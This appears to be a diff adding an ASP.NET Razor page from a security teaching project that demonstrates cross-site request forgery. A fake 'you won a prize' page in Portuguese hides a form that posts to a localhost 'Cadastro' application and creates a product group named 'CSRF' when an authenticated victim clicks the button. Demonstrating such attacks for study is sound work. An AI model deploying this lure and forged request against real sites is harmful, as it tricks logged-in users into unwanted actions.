@@ -1,0 +1,15 @@
+﻿
+@{
+    ViewBag.Title = "você Ganhou";
+}
+
+<div class="jumbotron">
+    <h1>Parabéns</h1>
+    <!-- executa ação do outro site (Controle Cadastro), se o usuario estiver autenticado (CSRF) -->
+    <form action="https://localhost:44302/Cadastro/SalvarGrupoProduto" method="post">
+        <input type="hidden" name="Id" value="0"/>
+        <input type="hidden" name="Nome" value="CSRF" />
+        <input type="hidden" name="Ativo" value="true" />
+        <p> Clique <input type="submit" class="btn btn-primary btn-lg" value="aqui"> Para receber seu Premio
+    </form>
+</div>
